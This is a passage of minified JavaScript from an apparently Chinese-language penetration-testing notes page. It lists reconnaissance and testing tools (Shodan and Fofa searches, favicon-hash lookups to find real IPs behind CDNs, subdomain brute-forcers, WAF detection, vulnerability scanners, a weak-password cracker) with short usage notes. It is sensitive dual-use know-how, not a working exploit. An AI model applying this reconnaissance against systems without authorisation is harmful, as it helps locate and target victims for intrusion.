\u519B\u4F53\u62F3"]="\u3010awvs\u3011+\u3010XRay\u3011\u8054\u52A8\uFF0C\u6253\u51FA \u519B\u4F53\u62F3"})(I||(I={}));var g=function i(){Object(t.a)(this,i)};g.\u9ED1\u6697\u5F15\u64CE_\u5217\u8868=function(){var i=[{name:"Fofa",url:"https://fofa.so/"},{name:"ZoomEye",url:"https://www.zoomeye.org/"},{name:"Shodan",url:"https://www.shodan.io/"},{name:"Binary Edge \uFF08\u6BD4Shodan\u641C\u7D22\u5185\u5BB9\u8FD8\u591A\uFF01\uFF09",url:"https://www.binaryedge.io/"},{name:"CenSys Search",url:"https://search.censys.io/"}];return{list:i,ui:u.a.createElement(u.a.Fragment,null,u.a.createElement("div",null,i.map(function(f){return u.a.createElement("span",{style:{marginRight:"1em"}},E(f.name,f.url))})),u.a.createElement("div",null,"\u7279\u6B8A\u6807\u8BC6\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"IDC\u8868\u793A\uFF1A",m.l.get_img(n("9IgH"),{max_height:"8em"})),u.a.createElement("li",null,"IP\u805A\u5408\u8868\u793A\uFF1A",m.l.get_img(n("1WT5"),{max_height:"8em"})),u.a.createElement("li",null,"\u65F6\u95F4\u67E5\u770B\u6240\u6709\u8868\u793A\uFF1A",m.l.get_img(n("h4Gq"),{max_height:"8em"}),u.a.createElement("ol",null,u.a.createElement("li",null,"\u7ECF\u5E38\u53EF\u4EE5\uFF0C\u6709\u610F\u5916\u7684\u53D1\u73B0"))),u.a.createElement("li",null,"\u67E5\u770B\u53EF\u80FD\u6F0F\u6D1E\uFF1A(ZoomEye)",m.l.get_img(n("VWeJ"),{max_height:"8em"})),u.a.createElement("li",null,u.a.createElement("br",null)),u.a.createElement("li",null,"\u67E5\u770B\u3010\u5355\u673A\u8BE6\u60C5\u3011:(FOFA)",E("fofa.so/hosts/<IP\u5730\u5740>")))))}}(),g.\u57FA\u672C={name:"\u9ED1\u6697\u641C\u7D22\u5F15\u64CE",desc:u.a.createElement(u.a.Fragment,null,"\u56DB\u5927\u9ED1\u6697\u641C\u7D22\u5F15\u64CE"),content:u.a.createElement(u.a.Fragment,null,g.\u9ED1\u6697\u5F15\u64CE_\u5217\u8868.ui)},g.\u57DF\u540D_\u6536\u96C6={name:"\u9ED1\u6697\u5F15\u64CE_\u57DF\u540D_\u6536\u96C6",content:u.a.createElement(u.a.Fragment,null,g.\u9ED1\u6697\u5F15\u64CE_\u5217\u8868.ui)},g.\u7AEF\u53E3_\u6536\u96C6={name:"\u9ED1\u6697\u5F15\u64CE_\u7AEF\u53E3_\u6536\u96C6",content:u.a.createElement(u.a.Fragment,null,g.\u9ED1\u6697\u5F15\u64CE_\u5217\u8868.ui)},g.\u65C1\u6CE8_\u53CD\u67E5IP={name:"\u9ED1\u6697\u5F15\u64CE_\u65C1\u6CE8_\u53CD\u67E5IP",content:u.a.createElement(u.a.Fragment,null,g.\u9ED1\u6697\u5F15\u64CE_\u5217\u8868.ui)},g.\u9891\u7387\u4ECB\u7ECD=u.a.createElement(u.a.Fragment,null,"\u722C\u7684\u9891\u7387\uFF0C\u6BD4\u5149\u660E\u5F15\u64CE\u66F4\u65B0\u4E00\u4E9B",u.a.createElement("br",null),"Google\uFF0C\u53EF\u80FD\u722C\u7684\u662F \u51E0\u5929\u4E4B\u524D",u.a.createElement("br",null),"\u9ED1\u6697\u5F15\u64CE\uFF0C\u53EF\u80FD\u5C31 \u51E0\u5206\u949F\u4E4B\u524D",u.a.createElement("br",null)),g.\u7279\u5B9A\u6587\u4EF6={name:"\u7279\u5B9A\u6587\u4EF6",content:u.a.createElement(u.a.Fragment,null,"\u54C8\u5E0C\u503C md5\u503C",u.a.createElement("ol",null,u.a.createElement("li",null)),"ico\u6587\u4EF6",u.a.createElement("ol",null,u.a.createElement("li",null,"\u57FA\u672C\u4ECB\u7ECD",u.a.createElement("ol",null,u.a.createElement("li",null,"Shodan\u514D\u8D39\u67E5\u627E",u.a.createElement("ol",null,u.a.createElement("li",null,"\u5BF9\u3010\u56FD\u5185\u7F51\u7AD9\u3011\uFF0C\u6210\u529F\u7387\u4E5F\u5F88\u9AD8\uFF01"))),u.a.createElement("li",null,"Fofa\u9700\u8981 \u51B2\u5230 \u9AD8\u7EA7\u4F1A\u5458\u3002",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6682\u65F6\u6CA1\u5FC5\u8981\u7528 Fofa"))))),u.a.createElement("li",null,"\u539F\u7406",u.a.createElement("ol",null,u.a.createElement("li",null,"CDN\u672C\u8EAB\uFF0C\u4F1A\u7F13\u5B58\u5927\u90E8\u5206\u4E1C\u897F"),u.a.createElement("li",null,"\u4F46\u3010ico\u3011\u6587\u4EF6\uFF0C\u53EF\u80FD\u662F\u4E0D\u4F1A\u88AB\u7F13\u5B58\u7684"),u.a.createElement("li",null,"\u800C\u4E14\uFF0C\u3010Shodan\u3011\uFF0C\u672C\u8EAB\u4F1A\u5BF9 CDN \u505A\u4E00\u4E9B\u8FC7\u6EE4\uFF0C\u4FDD\u8BC1 \u5927\u90E8\u5206\u662F\u6CA1\u6709 CDN \u7684\u3002"))),u.a.createElement("li",null,"\u641C\u7D22 ico \u6587\u4EF6\uFF0C\u4EE5\u627E\u5230 \u771F\u5B9EIP \u3002"),u.a.createElement("li",null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u7528 Python \u811A\u672C\uFF0C\u751F\u6210 ico \u7684 md5\u3002\uFF08\u89C1 \u300AWangPan\u9879\u76EE\u300B \uFF09"),u.a.createElement("li",null,"\u8FDB\u5165\u3010",E("www.shodan.io/search?query=http.favicon.hash:<\u5904\u7406\u8FC7\u7684hash\u503C>"),"\u3011")))),u.a.createElement("br",null),g.\u9ED1\u6697\u5F15\u64CE_\u5217\u8868.ui)};var c=function(){function i(){Object(t.a)(this,i)}return Object(S.a)(i,null,[{key:"\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li",value:function(P){function D(C){return u.a.createElement("li",null,u.a.createElement("h3",{style:{textDecoration:"underline overline"}},C.name),u.a.createElement("ol",null,u.a.createElement("li",null,C.content)))}return P.steps?P.steps.map(function(C){return D(C)}):D(P)}}]),i}();c.asm_ca_com_\u8D85\u7EA7Ping={name:"asm_ca_com_\u8D85\u7EA7Ping",content:u.a.createElement(u.a.Fragment,null,"\u4ECB\u7ECD",u.a.createElement("ol",null,u.a.createElement("li",null,"\u5DF2\u8FC7\u65F6\uFF0C\u4E0D\u518D\u63D0\u4F9B\uFF08\u6211\u4E4B\u524D\uFF0C\u4E5F\u9047\u5230\u8FC7\u4E00\u6B21\uFF09")),"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDB\u5165\u3010",E("asm.ca.com/en/ping.php"),"\u3011"),u.a.createElement("li",null,"\u56FD\u5BB6\u3001\u5730\u533A\u6570\u91CF\uFF0C\u6BD4\u8F83\u591A\u3002"),u.a.createElement("li",null,"\u514D\u8D39\u7684")))},c.tools_ipip_net_\u8D85\u7EA7Ping={name:"tools_ipip_net_\u8D85\u7EA7Ping",desc:u.a.createElement(u.a.Fragment,null,"\u6210\u529F\u7387\u771F\u7684\u4E0D\u9AD8\uFF1B\u67E5\u4E0D\u5230"),content:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDB\u5165\u3010",E("tools.ipip.net/cdn.php"),"\u3011"),u.a.createElement("li",null,"\u56FD\u5BB6\u3001\u5730\u533A\u6570\u91CF\uFF0C\u6BD4\u8F83\u591A\u3002"),u.a.createElement("li",null,"\u514D\u8D39\u7684")))},c.get_site_ip_\u771F\u5B9EIP_\u7B2C\u4E09\u65B9\u63A5\u53E3={name:"get_site_ip_\u771F\u5B9EIP_\u7B2C\u4E09\u65B9\u63A5\u53E3",content:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDB\u5165\u3010",E("get-site-ip.com","get-site-ip.com"),"\u3011"),u.a.createElement("li",null,"\u7B80\u5355\u7684\u83B7\u53D6IP\u5730\u5740"),u.a.createElement("li",null,"\u4E0D\u4E00\u5B9A\u5B8C\u5168\u51C6\u786E")))},c.zmap={name:"zmap",content:u.a.createElement(u.a.Fragment,null,"\u53F7\u79F0\u5168\u7F51\u641C\u7D22\u6740\u5668")},c.fuckcdn={name:"fuckcdn",desc:u.a.createElement(u.a.Fragment,null,"\u76F8\u5BF9\u800C\u8A00\uFF0C\u597D\u4E00\u4E9B"),content:u.a.createElement(u.a.Fragment,null,"Python\u5F00\u53D1\u7684",u.a.createElement("ol",null,u.a.createElement("li",null)),"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u914D\u7F6E\u6587\u4EF6"),u.a.createElement("li",null,"\u8F93\u5165 dig \u7684DNS\u89E3\u6790\u5730\u5740 \uFF08dig \u6BD4 lookup \u7684\u7ED3\u679C\u8981\u597D\uFF09")))},c.w8fuckcdn={name:"w8fuckcdn",desc:u.a.createElement(u.a.Fragment,null,"\u6709\u4E00\u4E9B\u5C0F\u95EE\u9898"),content:u.a.createElement(u.a.Fragment,null)},c.dnsdb_io_DNS\u89E3\u6790\u8BB0\u5F55={name:"dnsdb_io_DNS\u89E3\u6790\u8BB0\u5F55",content:u.a.createElement(u.a.Fragment,null,"\u4E5F\u53EF\u4EE5",u.a.createElement("ol",null,u.a.createElement("li",null)))},c.namelimit_com_DNS\u89E3\u6790\u8BB0\u5F55={name:"namelimit_com_DNS\u89E3\u6790\u8BB0\u5F55",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDB\u5165\u3010",E("namelimit.com/subdomain/lookup.name?domain=<\u57DF\u540D>"),"\u3011")))},c.WafW00f_\u8BC6\u522BWAF={name:"WafW00f",desc:u.a.createElement(u.a.Fragment,null,"\u8FD8\u5728\u66F4\u65B0",u.a.createElement("br",null),"\u652F\u6301\u9762\uFF0C\u6BD4\u5176\u4ED6\u5DE5\u5177\u8981\u597D\u4E00\u4E9B",u.a.createElement("br",null)),content:u.a.createElement(u.a.Fragment,null,"\u6709\u4E00\u5B9A\u7684 \u8BEF\u62A5 \uFF0C\u6216 \u8BC6\u522B\u4E0D\u51FA\uFF1B \u4F46\u5176\u4ED6\u5DE5\u5177\u90FD\u4E0D\u597D\u4F7F",u.a.createElement("ol",null,u.a.createElement("li",null,"\u7528 \u624B\u5DE5 \u7684\u8BDD\uFF0C\u5C31\u6BD4\u8F83\u9EBB\u70E6\u4E86")),"\u5E38\u7528Waf\u6E05\u5355",u.a.createElement("ol",null,u.a.createElement("li",null,"AliYunDun"),u.a.createElement("li",null,"AnYu"),u.a.createElement("li",null,"AWS"),u.a.createElement("li",null,"GoDaddy"),u.a.createElement("li",null,"Huawei Cloud Firewall"),u.a.createElement("li",null,"Oracle"),u.a.createElement("li",null,"ModSecurity"),u.a.createElement("li",null,"NSFocus \u7EFF\u76DF"),u.a.createElement("li",null,"Safedog"),u.a.createElement("li",null,"WTS \u62A4\u536B\u795E"),u.a.createElement("li",null,"360"),u.a.createElement("li",null,"XuanWuDun"),u.a.createElement("li",null,"YunDun")),"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6267\u884C")))},c.www_dnsgrep_cn_\u5B50\u57DF\u540D={name:"www_dnsgrep_cn_\u5B50\u57DF\u540D",content:u.a.createElement(u.a.Fragment,null,"\u4ECB\u7ECD",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6709\u65F6\u4F1A\u6F0F\u4E00\u4E9B\u57DF\u540D")),"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDB\u5165\u3010",E("www.dnsgrep.cn/subdomain/<\u57DF\u540D>"),"\u3011")))},c.teemo_\u5168\u81EA\u52A8\u57DF\u540D_\u5B50\u57DF\u540D_\u6536\u96C6\u5DE5\u5177={name:"teemo_\u5168\u81EA\u52A8\u57DF\u540D_\u6536\u96C6\u5DE5\u5177",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},c.Layer_\u5B50\u57DF\u540D_\u6316\u6398\u673A_\u5DE5\u5177={name:"Layer_\u5B50\u57DF\u540D_\u6316\u6398\u673A_\u5DE5\u5177",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},c.\u706F\u5854ARL_\u5168\u81EA\u52A8_\u6240\u6709\u8D44\u4EA7\u6536\u96C6_\u5DE5\u5177={name:"\u706F\u5854ARL_\u5168\u81EA\u52A8_\u6240\u6709\u8D44\u4EA7\u6536\u96C6_\u5DE5\u5177",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u9879\u76EE\u5730\u5740\uFF1A",E("github.com/TophantTechnology/ARL"))),"API\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,E("\u4F7F\u7528ARL\u706F\u5854API\u7F16\u5199Py\u811A\u672C\uFF0C\u5B9E\u73B0\u5FEB\u901F\u4FBF\u6377\u4FE1\u606F\u641C\u96C6+\u8D44\u4EA7\u7BA1\u7406\uFF01 - \u4E91+\u793E\u533A - \u817E\u8BAF\u4E91","https://cloud.tencent.com/developer/article/1851211")),u.a.createElement("li",null,E("\u624B\u628A\u624B\u6559\u4F60\u5199ARL\u8D44\u4EA7\u4FA6\u5BDF\u706F\u5854\u7CFB\u7EDF\u6279\u91CFAPI(\u4E0A) - FreeBuf\u7F51\u7EDC\u5B89\u5168\u884C\u4E1A\u95E8\u6237","https://www.freebuf.com/sectool/258791.html"))))},c.subdomainbrute_\u5B50\u57DF\u540D_\u7206\u7834\u5DE5\u5177={name:"subdomainbrute_\u5B50\u57DF\u540D_\u7206\u7834\u5DE5\u5177",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},c.crt_sh_\u8BC1\u4E66\u67E5\u8BE2={name:"crt_sh_\u8BC1\u4E66\u67E5\u8BE2",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDB\u5165\u3010",E("crt.sh"),"\u3011")))},c.opengps_cn_IP\u5B9A\u4F4D={name:"opengps_cn_IP\u5B9A\u4F4D",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDB\u5165",E("opengps.cn")),u.a.createElement("li",null,"\u53EF\u9009\u7528 \u9AD8\u7CBE\u5EA6IP\u5B9A\u4F4D4",u.a.createElement("ol",null,u.a.createElement("li",null,"\u73B0\u5728\u4E00\u822C\uFF0C\u3010ip4\u901A\u9053\u3011\u6BD4\u8F83\u6709\u6548")))),"\u4ECB\u7ECD\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u3010ip4\u901A\u9053\u3011\uFF0C\u67E5\u8BE2\u5230\u7684\u7ED3\u679C\u4E5F\u662F\u9519\u8BEF\u7684\uFF1B\u867D\u7136\u76F8\u5DEE\u4E86\u53EA\u6709\u51E0\u767E\u7C73\uFF0C\u4F46\u7ED9\u51FA\u7684\u533A\u57DF\u6839\u672C\u4E0D\u5BF9\u3002\uFF08\u8FC7\u4E8E\u81EA\u4FE1\u4E86\uFF09")))},c.ipinfo_io_IP\u5B9A\u4F4D={name:"ipinfo_io_IP\u5B9A\u4F4D",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDB\u5165",E("ipinfo.io")),u.a.createElement("li",null,"\u53EF\u83B7\u5F97 \u9AD8\u7CBE\u5EA6IP\u5B9A\u4F4D4")),"\u4ECB\u7ECD\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u67E5\u56FD\u5185\u7684IP\uFF0C\u7ED3\u679C\u975E\u5E38\u79BB\u8C31\uFF1B\u3010\u6D4E\u5357\u3011\u7684IP\uFF0C\u88AB\u8BC6\u522B\u5230\u3010\u5929\u6D25\u3011\u90A3\u8FB9\u53BB\u4E86\u3002")))},c.chaipip_com_IP\u5B9A\u4F4D={name:"chaipip_com_IP\u5B9A\u4F4D",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDB\u5165",E("chaipip.com/aiwen.html")),u.a.createElement("li",null,"\u53EF\u83B7\u5F97 \u9AD8\u7CBE\u5EA6IP\u5B9A\u4F4D4")),"\u4ECB\u7ECD\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u7ED3\u679C\u8FD8\u53EF\u4EE5\uFF0C\u4F46\u4ECD\u7136\u662F\u9519\u7684\uFF0C\u76F8\u5DEE\u4E86\u51E0\u767E\u7C73\uFF1B\u548C\u3010opengps.cn\u3011\u7ED3\u679C\u7C7B\u4F3C")))},c.met_red_IP\u5B9A\u4F4D={name:"met_red_IP\u5B9A\u4F4D",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDB\u5165",E("met.red/h/location/queryIp")),u.a.createElement("li",null,"\u53EF\u83B7\u5F97 \u9AD8\u7CBE\u5EA6IP\u5B9A\u4F4D4")),"\u4ECB\u7ECD\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u7ED3\u679C\u5C31\u5F88\u79BB\u8C31\uFF0C\u6211\u5728\u516C\u53F8\uFF0C\u7ED9\u6211\u5B9A\u5230\u3010\u8DB5\u7A81\u6CC9\u3011\u53BB\u4E86\uFF1B\u76F8\u5DEE\u4E86\u67097\u30018\u516C\u91CC")))},c.riskIQ_IP\u5927\u6570\u636E\u753B\u50CF={name:"riskIQ_IP\u5927\u6570\u636E\u753B\u50CF",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDB\u5165",E("RiskIQ Community Edition","https://community.riskiq.com/"))))},c.Goby_\u64CD\u4F5C\u7CFB\u7EDF_\u6F0F\u6D1E\u626B\u63CF={name:"Goby_\u6F0F\u6D1E\u626B\u63CF",desc:u.a.createElement(u.a.Fragment,null,"\u9488\u5BF9 \u64CD\u4F5C\u7CFB\u7EDF"),content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u56FE\u5F62\u5316\u626B\u63CF")))},c.Nessus_\u64CD\u4F5C\u7CFB\u7EDF__\u6F0F\u6D1E\u626B\u63CF={name:"Nessus_\u6F0F\u6D1E\u626B\u63CF",desc:u.a.createElement(u.a.Fragment,null,"\u9488\u5BF9 \u64CD\u4F5C\u7CFB\u7EDF",u.a.createElement("br",null),u.a.createElement("br",null),"\u66F4\u63A8\u8350\u4F7F\u7528\u8FD9\u4E2A"),tags:[p.\u4F18\u5148\u63A8\u8350\u4F7F\u7528],content:u.a.createElement(u.a.Fragment,null,"\u4ECB\u7ECD",u.a.createElement("ol",null,u.a.createElement("li",null,"\u4E00\u76F4\u5728\u66F4\u65B0"),u.a.createElement("li",null,"\u5386\u53F2\u60A0\u4E45"),u.a.createElement("li",null,"\u529F\u80FD\u66F4\u591A")),"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},c.OpenVas_\u64CD\u4F5C\u7CFB\u7EDF__\u6F0F\u6D1E\u626B\u63CF={name:"OpenVas_\u6F0F\u6D1E\u626B\u63CF",desc:u.a.createElement(u.a.Fragment,null,"\u9488\u5BF9 \u64CD\u4F5C\u7CFB\u7EDF"),content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},c.Nexpose_\u64CD\u4F5C\u7CFB\u7EDF__\u6F0F\u6D1E\u626B\u63CF={name:"Nexpose_\u6F0F\u6D1E\u626B\u63CF",desc:u.a.createElement(u.a.Fragment,null,"\u9488\u5BF9 \u64CD\u4F5C\u7CFB\u7EDF"),content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},c.MetaSploit_\u6F0F\u6D1E_\u5DE5\u5177\u6846\u67B6={name:"MetaSploit_\u6F0F\u6D1E_\u5DE5\u5177\u6846\u67B6",desc:u.a.createElement(u.a.Fragment,null),content:u.a.createElement(u.a.Fragment,null,"\u4ECB\u7ECD\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"auxiliary\uFF0C\u786E\u5B9A\u6F0F\u6D1E"),u.a.createElement("li",null,"exploit\uFF0C\u5229\u7528\u6F0F\u6D1E")),"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},c.SearchSploit_\u6F0F\u6D1E_\u5DE5\u5177\u6846\u67B6={name:"SearchSploit_\u6F0F\u6D1E_\u5DE5\u5177\u6846\u67B6",desc:u.a.createElement(u.a.Fragment,null),content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},c.cmsscan_CMS\u63A2\u9488={name:"cmsscan_CMS\u63A2\u9488",desc:u.a.createElement(u.a.Fragment,null),tags:[],content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},c.wpscan_CMS\u63A2\u9488={name:"wpscan_CMS\u63A2\u9488",desc:u.a.createElement(u.a.Fragment,null),tags:[],content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},c.joomscan_CMS\u63A2\u9488={name:"joomscan_CMS\u63A2\u9488",desc:u.a.createElement(u.a.Fragment,null),tags:[],content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},c.drupalscan_CMS\u63A2\u9488={name:"drupalscan_CMS\u63A2\u9488",desc:u.a.createElement(u.a.Fragment,null),tags:[],content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},c.yunsee\u4E91\u6089_CMS\u63A2\u9488={name:"yunsee\u4E91\u6089_CMS\u63A2\u9488",desc:u.a.createElement(u.a.Fragment,null),content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u9700\u8981\u4E00\u4E2A\u3010\u9080\u8BF7\u7801\u3011\u3002\u800C\u5FC5\u987B\u8981\u53BB\u3010\u793C\u54C1\u5546\u573A\u3011\u5151\u6362\u3002"),u.a.createElement("li",null,"\u8FDB\u5165",E("\u4E91\u6089\u4E92\u8054\u7F51\u6307\u7EB9","https://www.yunsee.cn/"))))},c.WhatWeb_CMS\u63A2\u9488={name:"WhatWeb_CMS\u63A2\u9488",desc:u.a.createElement(u.a.Fragment,null),tags:[],content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},c.Wrappalyzer_CMS\u63A2\u9488={name:"Wrappalyzer_CMS\u63A2\u9488",desc:u.a.createElement(u.a.Fragment,null),tags:[],content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)),"\u989D\u5916\u7684\u4E00\u4E9B\u77E5\u8BC6",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6BCF\u4E2A\u6708\u4ED8\u8D39\u3010$5\u3011\uFF0C\u53EF\u4EE5\u89E3\u9501\u3010\u9AD8\u7EA7\u529F\u80FD\u3011\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u67E5\u770B\u66F4\u591A\u7684CMS\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01")))},c.xray_WEB\u5E94\u7528_\u6F0F\u6D1E\u626B\u63CF={name:"xray_WEB\u5E94\u7528_\u6F0F\u6D1E\u626B\u63CF",desc:u.a.createElement(u.a.Fragment,null,I["\u3010BurpSuite\u3011+\u3010XRay\u3011\u8054\u52A8\uFF0C\u6253\u51FA \u519B\u4F53\u62F3"],I["\u3010awvs\u3011+\u3010XRay\u3011\u8054\u52A8\uFF0C\u6253\u51FA \u519B\u4F53\u62F3"]),content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},c.awvs_WEB\u5E94\u7528_\u6F0F\u6D1E\u626B\u63CF={name:"awvs_WEB\u5E94\u7528_\u6F0F\u6D1E\u626B\u63CF",desc:u.a.createElement(u.a.Fragment,null,I["\u3010awvs\u3011+\u3010XRay\u3011\u8054\u52A8\uFF0C\u6253\u51FA \u519B\u4F53\u62F3"]),content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},c.appscan_WEB\u5E94\u7528_\u6F0F\u6D1E\u626B\u63CF={name:"appscan_WEB\u5E94\u7528_\u6F0F\u6D1E\u626B\u63CF",desc:u.a.createElement(u.a.Fragment,null),content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},c.seay_PHP_\u4EE3\u7801\u5BA1\u8BA1={name:"seay_PHP_\u4EE3\u7801\u5BA1\u8BA1",desc:u.a.createElement(u.a.Fragment,null),content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u76D1\u63A7mysql"),u.a.createElement("li",null,"\u5728\u6E90\u7801\u4E2D\uFF0C\u5B9A\u4F4Dsql")))},c.BurpSuite_\u6293\u5305\u5DE5\u5177={name:"BurpSuite_\u6293\u5305\u5DE5\u5177",desc:u.a.createElement(u.a.Fragment,null,I["\u3010BurpSuite\u3011+\u3010XRay\u3011\u8054\u52A8\uFF0C\u6253\u51FA \u519B\u4F53\u62F3"]),content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},c.Charles_\u6293\u5305\u5DE5\u5177={name:"Charles_\u6293\u5305\u5DE5\u5177",desc:u.a.createElement(u.a.Fragment,null),content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},c.Fiddler_\u6293\u5305\u5DE5\u5177={name:"Fiddler_\u6293\u5305\u5DE5\u5177",desc:u.a.createElement(u.a.Fragment,null),content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},c.\u6293\u5305\u7CBE\u7075_\u6293\u5305\u5DE5\u5177={name:"\u6293\u5305\u7CBE\u7075_\u6293\u5305\u5DE5\u5177",desc:u.a.createElement(u.a.Fragment,null),content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},c.WireShark_\u6293\u5305\u5DE5\u5177={name:"WireShark_\u6293\u5305\u5DE5\u5177",desc:u.a.createElement(u.a.Fragment,null),content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},c.ApkAnalyzer_\u89E3\u5305_\u9006\u5411\u5DE5\u5177={name:"ApkAnalyzer_\u89E3\u5305_\u9006\u5411\u5DE5\u5177",desc:u.a.createElement(u.a.Fragment,null),content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},c.masscan_\u7AEF\u53E3\u626B\u63CF={name:"masscan_\u7AEF\u53E3\u626B\u63CF",desc:u.a.createElement(u.a.Fragment,null),content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},c.SnetCracker_\u5F31\u53E3\u4EE4\u68C0\u67E5_\u7206\u7834\u5DE5\u5177={name:"SnetCracker_\u5F31\u53E3\u4EE4\u68C0\u67E5_\u7206\u7834\u5DE5\u5177",desc:u.a.createElement(u.a.Fragment,null),tags:[p.\u4F18\u5148\u63A8\u8350\u4F7F\u7528],content:u.a.createElement(u.a.Fragment,null,"\u4ECB\u7ECD",u.a.createElement("ol",null,u.a.createElement("li",null,"\u56FD\u4EA7\u7684\uFF0C\u5F88\u597D\u7528")),"\u4E00\u4E9B\u60C5\u51B5",u.a.createElement("ol",null,u.a.createElement("li",null,"\u626B\u63CF\u4E0D\u5230\uFF0C\u53EF\u80FD\u6709\u4E24\u79CD\u60C5\u51B5",u.a.createElement("ol",null,u.a.createElement("li",null,"IP\u65E0\u6CD5\u8FDE\u63A5"),u.a.createElement("li",null,"\u3010root\u3011\u8D26\u6237\uFF0C\u9ED8\u8BA4\u4E0D\u652F\u6301\u5916\u8FDE")))),"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},c.Soap_UI_PRO_\u4E0D\u77E5\u9053\u662F\u5565\u7684\u6D4B\u8BD5\u5DE5\u5177={name:"Soap_UI_PRO_\u4E0D\u77E5\u9053\u662F\u5565\u7684\u6D4B\u8BD5\u5DE5\u5177",desc:u.a.createElement(u.a.Fragment,null),tags:[p.\u653E\u5230\u6700\u540E\u8003\u8651],content:u.a.createElement(u.a.Fragment,null,"\u53EF\u4EE5\u7528\u6765\u6D4B\u8BD5\u3010wsdl\u3011",u.a.createElement("ol",null,u.a.createElement("li",null)),"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},c.api_hackertarget_com_\u65C1\u6CE8_\u53CD\u67E5IP_\u76F4\u63A5\u63A5\u53E3={name:"api_hackertarget_com_\u65C1\u6CE8_\u76F4\u63A5\u63A5\u53E3_\u53CD\u67E5IP",desc:u.a.createElement(u.a.Fragment,null),content:u.a.cr